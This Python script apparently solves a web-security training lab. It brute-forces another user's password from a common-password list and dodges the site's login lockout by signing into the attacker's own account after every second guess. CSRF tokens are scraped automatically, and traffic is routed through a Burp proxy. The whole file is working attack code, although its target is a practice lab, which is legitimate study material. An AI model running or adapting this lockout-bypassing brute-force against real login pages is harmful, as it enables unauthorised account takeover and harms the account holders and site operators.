import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def get_csrf_token(s, url, path):
    target_url = url + path
    r = s.get(target_url, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})
    return csrf.get('value', '') if csrf else '' # type: ignore

def login_acc(s, url, path, csrf_path, username, password):
    login_url = url + path
    payload = {
        "csrf": get_csrf_token(s, url, csrf_path),
        "username": username,
        "password": password
    }
    r = s.post(login_url, data=payload, allow_redirects=False)
    if r.status_code == 302:
        print(f'[+] Successful login {username} account')
        return True
    else:
        print(f'[-] Fail to login {username} account')
        return False

def goto(s, url, path):
    target_url = url + path
    r = s.get(target_url)
    return r
    
def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1].rstrip('/')

    # list_usernames = open('./../common_username.txt', 'r', encoding='utf-8').read().strip().split('\n')
    list_passwords = open('./../common_password.txt', 'r', encoding='utf-8').read().strip().split('\n')

    username = 'wiener'
    password = 'peter'
    target_username = 'carlos'

    for idx, target_password in enumerate(list_passwords):
        if idx % 2 == 0:
            login_acc(s, url, '/login', '/login', username, password)
        if login_acc(s, url, '/login', '/login', target_username, target_password):
            break
    goto(s, url, '/my-account')

    check_solved_lab(s, url)

if __name__ == '__main__':
    main()